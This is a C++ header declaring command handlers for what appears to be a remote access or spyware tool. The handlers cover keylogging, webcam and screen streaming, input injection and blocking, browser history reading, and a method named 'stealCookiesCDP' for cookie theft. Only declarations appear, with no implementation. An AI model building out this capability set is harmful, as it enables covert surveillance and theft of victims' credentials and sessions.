#pragma once

#include <nlohmann/json.hpp>
using json = nlohmann::json;

class ProcessHandlers
{
private:
    static json makeStatus(bool success, const std::string &msg = "", json extra = {});

public:
    static json listApps(const json &);
    static json startApp(const json &);
    static json stopApp(const json &);

    static json listProcesses(const json &);
    static json startProcess(const json &);
    static json stopProcessPid(const json &);

    static json captureScreen(const json &);
    static json startScreenStream(const json &);
    static json stopScreenStream(const json &);

    static json startWebcamRecord(const json &);
    static json stopWebcamRecord(const json &);
    static json startWebcamStream(const json &);
    static json stopWebcamStream(const json &);

    static json startKeylog(const json &);
    static json stopKeylog(const json &);

    static json handleMouseInput(const json &);

    static json systemShutdown(const json &);
    static json systemRestart(const json &);

    static json stealCookiesCDP(const json &);

    static json handleKeyboardInput(const json &);

    static json handleChatCommand(const json &);
    static json getWifiInfo(const json &);

    // Input Blocking
    static json blockInput(const json &);
    static json unblockInput(const json &);
    static json getBlockStatus(const json &);

    // Browser History
    static json getBrowserList(const json &);
    static json getBrowserHistory(const json &);
};